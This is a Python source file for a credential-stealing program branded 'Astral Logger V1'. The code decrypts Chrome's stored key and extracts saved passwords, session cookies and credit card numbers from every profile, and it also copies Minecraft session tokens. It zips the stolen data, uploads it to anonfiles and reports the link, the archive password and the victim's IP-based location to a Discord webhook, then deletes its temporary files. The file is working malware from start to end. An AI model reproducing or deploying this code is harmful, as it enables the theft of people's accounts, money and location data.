from os import getenv, mkdir, listdir, remove
from os.path import join, dirname, realpath
from random import choice
from dhooks import Embed, Webhook
from string import ascii_letters
from json import loads
from requests import get, post
from base64 import b64decode
from win32crypt import CryptUnprotectData
from shutil import copy2, rmtree
from pyzipper import AESZipFile, ZIP_DEFLATED, WZ_AES
from sqlite3 import connect
from winreg import HKEY_CURRENT_USER, OpenKey, KEY_ALL_ACCESS, SetValueEx, REG_SZ, CloseKey
from time import sleep
from datetime import datetime, timedelta
from Crypto.Cipher import AES


class Logger:
    def getMasterKey(self):
        with open(join(self.LOCALAPPDATA, "Google", "Chrome", "User Data", "Local State"), "r") as file:
            localState = file.read()
            localState = loads(localState)

        masterKey = b64decode(localState["os_crypt"]["encrypted_key"])
        masterKey = masterKey[5:]
        masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]

        return masterKey

    def decryptValue(self, buff):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(self.MASTER_KEY, AES.MODE_GCM, iv)
            decryptedPassword = cipher.decrypt(payload)
            decryptedPassword = decryptedPassword[:-16].decode()

            return decryptedPassword
        except:
            return ""

    def getChromeCookies(self):
        chromeLocation = join(getenv("LOCALAPPDATA"),
                              "Google", "Chrome", "User Data")
        possbileLocations = ["Default", "Guest Profile"]

        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possbileLocations.append(directoryName)

        cookiesFile = open(
            join(self.MAIN_DIRECTORY, "ChromeCookies.txt"), "a")
        cookiesFile.write(
            "Chrome Cookies\n")

        for location in possbileLocations:
            try:
                databasePath = join(
                    chromeLocation, location, "Network", "Cookies")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name, path, encrypted_value FROM cookies")

                    for r in databaseCursor.fetchall():
                        name = r[0]
                        path = r[1]
                        decryptedValue = self.decryptValue(r[2])

                        cookiesFile.write(f"""
==========================================
Cookie Name: {name}
Cookie Path: {path}
Decrypted Cookie: {decryptedValue}
==========================================
                        """)
                except:
                    pass
            except:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cookiesFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except:
            pass

    def getMinecraftSessions(self):
        sessionsLocation = join(
            self.APPDATA, ".minecraft", "launcher_profiles.json")
        copy2(sessionsLocation, join(
            self.MAIN_DIRECTORY, "MinecraftSessions.json"))

    def getChromeCards(self):
        chromeLocation = join(self.LOCALAPPDATA,
                              "Google", "Chrome", "User Data")
        possbileLocations = ["Default", "Guest Profile"]
        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possbileLocations.append(directoryName)

        cardsFile = open(
            join(self.MAIN_DIRECTORY, "ChromeCards.txt"), "a")
        cardsFile.write(
            "Chrome Credit Cards\n")

        for location in possbileLocations:
            try:
                databasePath = join(chromeLocation, location, "Web Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")

                    for r in databaseCursor.fetchall():
                        nameOnCard = r[0]
                        expirationMonth = r[1]
                        expirationYear = r[2]
                        decryptedCardNumber = self.decryptValue(r[3])

                        cardsFile.write(f"""
==========================================
Name On Card: {nameOnCard}
Expiration Year: {expirationYear}
Expiration Month: {expirationMonth}
Decrypted Card Number: {decryptedCardNumber}
==========================================
                        """)
                except Exception as ex:
                    print(ex)
                    pass
            except:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cardsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except:
            pass

    def getChromePasswords(self):
        chromeLocation = join(self.LOCALAPPDATA,
                              "Google", "Chrome", "User Data")
        possbileLocations = ["Default", "Guest Profile"]
        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possbileLocations.append(directoryName)

        passwordsFile = open(
            join(self.MAIN_DIRECTORY, "ChromePasswords.txt"), "a")
        passwordsFile.write(
            "Chrome Passwords\n")

        for possibleLocation in possbileLocations:
            try:
                databasePath = join(
                    chromeLocation, possibleLocation, "Login Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT action_url, username_value, password_value, origin_url, date_last_used FROM logins")

                    for r in databaseCursor.fetchall():
                        url = r[0]
                        username = r[1]
                        decryptedPassword = self.decryptValue(r[2])
                        originUrl = r[3]
                        dateLastUsed = ""

                        try:
                            dateLastUsed = datetime(
                                1601, 1, 1) + timedelta(microseconds=r[4])
                        except:
                            pass

                        passwordsFile.write(f"""
==========================================#
Action URL: {url}
Origin URL: {originUrl}
Username: {username}
Decrypted Password: {decryptedPassword}
Date last Used: {dateLastUsed}
==========================================#
                    """)

                except:
                    pass
            except:
                pass

        databaseCursor.close()
        databaseConnection.close()
        passwordsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except:
            pass

    def __init__(self):
        self.APPDATA = getenv("APPDATA")
        self.LOCALAPPDATA = getenv("LOCALAPPDATA")
        self.WEBHOOK = Webhook(
            "%WEBHOOK_URL%")
        self.TEMP = getenv("TEMP")
        self.MASTER_KEY = self.getMasterKey()
        self.MAIN_ID = "".join(
            choice(ascii_letters) for x in range(8))
        self.PASSWORD = bytes("".join(
            choice(ascii_letters) for x in range(8)), encoding="utf-8")
        self.MAIN_DIRECTORY = join(self.TEMP, self.MAIN_ID)
        mkdir(self.MAIN_DIRECTORY)

        try:
            self.getChromeCards()
        except:
            pass
        try:
            self.getChromeCookies()
        except:
            pass
        try:
            self.getChromePasswords()
        except:
            pass
        try:
            self.getMinecraftSessions()
        except:
            pass

        infoEmbed = Embed(
            title="Astral Logger | New hit! 🌕",
            description="Someone just ran your stub! @everyone",
            color=0x6f1ca3
        )

        zipFile = AESZipFile(
            join(self.TEMP, f"{self.MAIN_ID}.zip"), 'w', compression=ZIP_DEFLATED, encryption=WZ_AES)
        zipFile.pwd = self.PASSWORD
        folderContents = listdir(self.MAIN_DIRECTORY)

        for fileName in folderContents:
            absolutePath = join(self.MAIN_DIRECTORY, fileName)

            zipFile.write(absolutePath, fileName)

        zipFile.close()

        anonFilesUrl = post("https://api.anonfiles.com/upload", files={
            "file": (f"Data.zip", open(join(self.TEMP, f"{self.MAIN_ID}.zip"), "rb")),
        }).json()['data']['file']['url']['short']

        ip = get("https://api.ipify.org").text
        ipInfo = get(f"http://ip-api.com/json/{ip}").json()
        username = getenv("USERNAME")
        infoEmbed.add_field(name="User Information",
                            value=f"```PC Username: {username}\nIP Address: {ip}\nCountry: {ipInfo['country']}\nRegion: {ipInfo['regionName']}\nCity: {ipInfo['city']}\nZip Code: {ipInfo['zip']}\nTimezone: {ipInfo['timezone']}\nISP: {ipInfo['isp']}```")
        infoEmbed.add_field(name="Stolen Data Download",
                            value=f"```Download URL: {anonFilesUrl}\nArchive Password: {str(self.PASSWORD)}```", inline=False)
        infoEmbed.set_footer(text='Astral Logger V1 | Made by punchmade#0333')
        infoEmbed.set_author(name='punchmade#0333')

        self.WEBHOOK.modify(name="Astral Logger | V1")
        self.WEBHOOK.send(embed=infoEmbed)
        remove(join(self.TEMP, f"{self.MAIN_ID}.zip"))
        rmtree(self.MAIN_DIRECTORY)


Logger()
